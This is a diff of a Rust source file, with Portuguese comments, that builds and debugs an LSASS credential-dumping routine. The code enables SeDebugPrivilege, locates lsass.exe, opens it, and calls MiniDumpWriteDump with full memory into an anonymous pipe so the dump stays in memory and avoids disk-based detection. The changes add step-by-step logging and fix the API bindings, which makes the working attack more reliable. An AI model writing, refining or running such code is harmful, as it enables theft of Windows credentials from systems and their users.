@@ -1,9 +1,7 @@
 use winapi::{
-    shared::minwindef::{DWORD, FALSE, TRUE, UINT},
+    shared::minwindef::{DWORD, FALSE},
     um::{
-        dbghelp::{MiniDumpWriteDump, MINIDUMP_TYPE},
         handleapi::CloseHandle,
-        memoryapi::OpenProcess,
         processthreadsapi::{OpenProcessToken, GetCurrentProcess},
         securitybaseapi::AdjustTokenPrivileges,
         tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W},
@@ -12,8 +10,12 @@ use winapi::{
             TOKEN_PRIVILEGES, TOKEN_QUERY, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
             PROCESS_VM_WRITE, PROCESS_VM_OPERATION,
         },
-        winbase::LOOKUP_PRIVILEGE_VALUEW,
+        winbase::LookupPrivilegeValueW,
         errhandlingapi::GetLastError,
+        fileapi::ReadFile,
+        namedpipeapi::CreatePipe,
+        winbase::HANDLE_FLAG_INHERIT,
+        minwinbase::LPOVERLAPPED,
     },
 };
 use std::ptr;
@@ -21,77 +23,101 @@ use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
 use std::mem;
 
-// Estrutura para callback do MiniDump
-struct CallbackContext {
-    buffer: Vec<u8>,
+// Declaração externa do OpenProcess
+#[link(name = "kernel32")]
+extern "system" {
+    fn OpenProcess(
+        dwDesiredAccess: DWORD,
+        bInheritHandle: i32,
+        dwProcessId: DWORD,
+    ) -> HANDLE;
 }
 
-extern "system" fn minidump_callback(
-    _call_type: UINT,
-    _callback_param: *mut ::std::os::raw::c_void,
-    _callback_input: *mut ::std::os::raw::c_void,
-    _callback_output: *mut ::std::os::raw::c_void,
-) -> BOOL {
-    // Implementação do callback pra capturar dados em memória
-    TRUE
+// Declaração externa da função MiniDumpWriteDump
+#[link(name = "DbgHelp")]
+extern "system" {
+    fn MiniDumpWriteDump(
+        hProcess: HANDLE,
+        ProcessId: DWORD,
+        hFile: HANDLE,
+        DumpType: u32,
+        ExceptionParam: *mut (),
+        UserStreamParam: *mut (),
+        CallbackParam: *mut (),
+    ) -> i32;
 }
 
 pub fn dump_to_memory() -> Result<Vec<u8>, String> {
-    // 1. Ativa privilégio SeDebugPrivilege
-    enable_debug_privilege()?;
+    println!("[LSASS] Step 1: Starting dump_to_memory...");
     
-    // 2. Encontra PID do lsass.exe
-    let pid = find_process_id("lsass.exe")?;
+    // Ativa privilégio SeDebugPrivilege
+    println!("[LSASS] Step 2: Enabling debug privilege...");
+    match enable_debug_privilege() {
+        Ok(_) => println!("[LSASS] Step 3: Debug privilege enabled"),
+        Err(e) => {
+            println!("[LSASS] Step 3 FAILED: {}", e);
+            return Err(e);
+        }
+    }
     
-    // 3. Abre processo com privilégios máximos
+    // Encontra PID do lsass.exe
+    println!("[LSASS] Step 4: Finding lsass.exe...");
+    let pid = match find_process_id("lsass.exe") {
+        Ok(p) => {
+            println!("[LSASS] Step 5: Found lsass.exe with PID: {}", p);
+            p
+        }
+        Err(e) => {
+            println!("[LSASS] Step 5 FAILED: {}", e);
+            return Err(e);
+        }
+    };
+    
+    // Abre processo com privilégios máximos
+    println!("[LSASS] Step 6: Opening process...");
     let process_handle = unsafe {
         OpenProcess(
             PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | 
             PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
-            FALSE,
+            0,
             pid,
         )
     };
     
     if process_handle.is_null() {
-        return Err(format!("Failed to open process, error: {}", unsafe { GetLastError() }));
+        let err = unsafe { GetLastError() };
+        println!("[LSASS] Step 6 FAILED: Failed to open process, error: {}", err);
+        return Err(format!("Failed to open process, error: {}", err));
     }
+    println!("[LSASS] Step 7: Process opened successfully");
     
-    // 4. Prepara buffer pra receber o dump
-    let mut dump_buffer: Vec<u8> = Vec::new();
-    
-    // 5. Configura callback pra capturar dump em memória
-    // NOTA: MiniDumpWriteDump normalmente escreve em arquivo.
-    // Pra capturar em memória, precisamos usar um callback ou
-    // criar um pipe/memória mapeada.
-    
-    // Abordagem alternativa: usar Named Pipe ou Memory-Mapped File
-    // Vamos usar um pipe anônimo pra capturar os dados
-    
-    use winapi::um::namedpipeapi::CreatePipe;
-    use winapi::um::handleapi::SetHandleInformation;
-    use winapi::um::winbase::{HANDLE_FLAG_INHERIT};
-    
+    // Cria pipe anônimo pra capturar os dados
+    println!("[LSASS] Step 8: Creating pipe...");
     let mut read_pipe: HANDLE = ptr::null_mut();
     let mut write_pipe: HANDLE = ptr::null_mut();
-    let sa = ptr::null_mut(); // Security attributes
+    let sa = ptr::null_mut();
     
     let success = unsafe {
         CreatePipe(&mut read_pipe, &mut write_pipe, sa, 0)
     };
     
     if success == 0 {
+        println!("[LSASS] Step 8 FAILED: Failed to create pipe");
         unsafe { CloseHandle(process_handle); }
         return Err("Failed to create pipe".to_string());
     }
+    println!("[LSASS] Step 9: Pipe created");
     
     // Garante que o pipe de leitura não é herdado
+    println!("[LSASS] Step 10: Setting pipe handle info...");
     unsafe {
-        SetHandleInformation(read_pipe, HANDLE_FLAG_INHERIT, 0);
+        winapi::um::handleapi::SetHandleInformation(read_pipe, HANDLE_FLAG_INHERIT, 0);
     }
+    println!("[LSASS] Step 11: Pipe handle info set");
     
-    // 6. Executa o MiniDumpWriteDump escrevendo no pipe
-    let dump_type: MINIDUMP_TYPE = 0x00000002; // MiniDumpWithFullMemory
+    // Executa o MiniDumpWriteDump escrevendo no pipe
+    println!("[LSASS] Step 12: Calling MiniDumpWriteDump (this may take 10-30 seconds)...");
+    let dump_type: u32 = 0x00000002; // MiniDumpWithFullMemory
     
     let result = unsafe {
         MiniDumpWriteDump(
@@ -108,15 +134,16 @@ pub fn dump_to_memory() -> Result<Vec<u8>, String> {
     unsafe { CloseHandle(write_pipe); }
     
     if result == 0 {
+        let err = unsafe { GetLastError() };
+        println!("[LSASS] Step 12 FAILED: MiniDumpWriteDump failed with error: {}", err);
         unsafe { CloseHandle(process_handle); CloseHandle(read_pipe); }
-        return Err(format!("MiniDumpWriteDump failed, error: {}", unsafe { GetLastError() }));
+        return Err(format!("MiniDumpWriteDump failed, error: {}", err));
     }
+    println!("[LSASS] Step 13: MiniDumpWriteDump succeeded!");
     
-    // 7. Lê os dados do pipe pro buffer
-    use winapi::um::fileapi::ReadFile;
-    use winapi::um::winnt::LPOVERLAPPED;
-    
-    let mut buffer = [0u8; 65536]; // 64KB chunks
+    // Lê os dados do pipe pro buffer
+    println!("[LSASS] Step 14: Reading from pipe...");
+    let mut buffer = [0u8; 65536];
     let mut bytes_read: DWORD = 0;
     let mut full_buffer = Vec::new();
     
@@ -137,6 +164,7 @@ pub fn dump_to_memory() -> Result<Vec<u8>, String> {
         
         full_buffer.extend_from_slice(&buffer[..bytes_read as usize]);
     }
+    println!("[LSASS] Step 15: Read {} bytes from pipe", full_buffer.len());
     
     unsafe { 
         CloseHandle(read_pipe);
@@ -144,16 +172,17 @@ pub fn dump_to_memory() -> Result<Vec<u8>, String> {
     }
     
     if full_buffer.is_empty() {
+        println!("[LSASS] Step 16 FAILED: No data read from pipe");
         return Err("No data read from pipe".to_string());
     }
     
+    println!("[LSASS] Step 17: Dump successful! Size: {} bytes", full_buffer.len());
     Ok(full_buffer)
 }
 
 fn enable_debug_privilege() -> Result<(), String> {
     let mut token_handle: HANDLE = ptr::null_mut();
     
-    // Abre token do processo atual
     let success = unsafe {
         OpenProcessToken(
             GetCurrentProcess(),
@@ -166,7 +195,6 @@ fn enable_debug_privilege() -> Result<(), String> {
         return Err("Failed to open process token".to_string());
     }
     
-    // Lookup LUID for SeDebugPrivilege
     let mut luid: LUID = unsafe { mem::zeroed() };
     let privilege_name: Vec<u16> = OsStr::new(SE_DEBUG_NAME)
         .encode_wide()
@@ -174,7 +202,7 @@ fn enable_debug_privilege() -> Result<(), String> {
         .collect();
     
     let success = unsafe {
-        LOOKUP_PRIVILEGE_VALUEW(
+        LookupPrivilegeValueW(
             ptr::null(),
             privilege_name.as_ptr(),
             &mut luid,
@@ -186,7 +214,6 @@ fn enable_debug_privilege() -> Result<(), String> {
         return Err("Failed to lookup privilege".to_string());
     }
     
-    // Ativa o privilégio
     let mut tp: TOKEN_PRIVILEGES = unsafe { mem::zeroed() };
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Luid = luid;
@@ -242,7 +269,6 @@ fn find_process_id(process_name: &str) -> Result<DWORD, String> {
     loop {
         let current_name = &entry.szExeFile;
         
-        // Compara nome do processo (case insensitive)
         if unsafe { 
             winapi::um::winbase::lstrcmpiW(current_name.as_ptr(), target_name.as_ptr()) == 0 
         } {
